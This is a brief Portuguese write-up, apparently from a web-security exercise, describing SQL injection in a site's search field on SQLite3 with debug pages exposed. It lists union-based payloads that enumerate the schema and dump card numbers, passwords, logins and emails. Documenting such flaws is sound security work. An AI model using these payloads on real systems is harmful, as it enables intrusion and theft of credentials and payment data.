Falhas e Ataques
Página Inicial: SQL Injection
Ao colocar uma aspa dupla (") no campo de busca, o site quebra. Isso mostra que o site é vulnerável a ataques SQL Injection. Um agravante é que o desenvolvedor deixou a página de Debug habilitada, mostrando detalhes do erro e inclusive a engine (SQLite3). Com a informação do SQL é possível compor um ataque que seja adicionado à cláusula where da query:

Original:

SELECT * FROM posts WHERE Content LIKE "%"%";
Alteradas:

SELECT * FROM posts WHERE Content LIKE "%X" union select 1, 2 --%";

X" union select 1, 2 --
X" union select name, sql from sqlite_master where type='table' --
X" union select name || ': ' || card, password from secrets --
X" union select login || ': ' || email, password from logins --
